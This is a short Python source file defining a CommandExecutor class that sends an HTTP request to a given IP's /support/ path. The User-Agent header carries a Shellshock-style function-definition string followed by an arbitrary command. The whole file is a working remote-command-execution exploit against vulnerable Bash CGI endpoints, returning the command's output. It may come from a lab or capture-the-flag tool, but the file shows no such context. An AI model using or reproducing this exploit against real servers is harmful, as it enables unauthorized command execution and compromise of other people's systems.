import requests


class CommandExecutor:

    @staticmethod
    def execute(ip: str, command: str) -> str:
        return requests.get(
            url=f"http://{ip}/support/",
            headers={
                "User-Agent": "() { :; }; " + command
            }
        ).text
